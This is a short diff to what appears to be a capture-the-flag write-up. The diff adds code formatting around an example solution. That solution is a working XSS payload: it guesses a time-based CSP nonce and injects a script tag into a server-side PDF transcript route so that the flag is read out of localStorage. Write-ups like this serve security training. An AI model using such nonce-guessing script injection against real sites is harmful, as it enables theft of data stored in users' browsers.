@@ -9,13 +9,14 @@ but the /pdftranscript route instead runs on the remote server and thus attackin
 it yields the flag.
 
 Here's an example solution (enter into browser console from the main page):
-
+```js
 const time = String(Math.round(new Date().getTime() / 1_000) + 3)
 const nonce = btoa(time + (Number(time.slice(-1)) >= 5 ? '5' : '0') + '00')
 window.location.href = '/pdftranscript?transcript=' + encodeURIComponent(JSON.stringify({
     studentName: `<script nonce="${nonce}">document.write(localStorage.flag)</script>`,
     courses: []
 }))
+```
 
 Note that this script might take a few tries to work because the nonce
 might be slightly off.
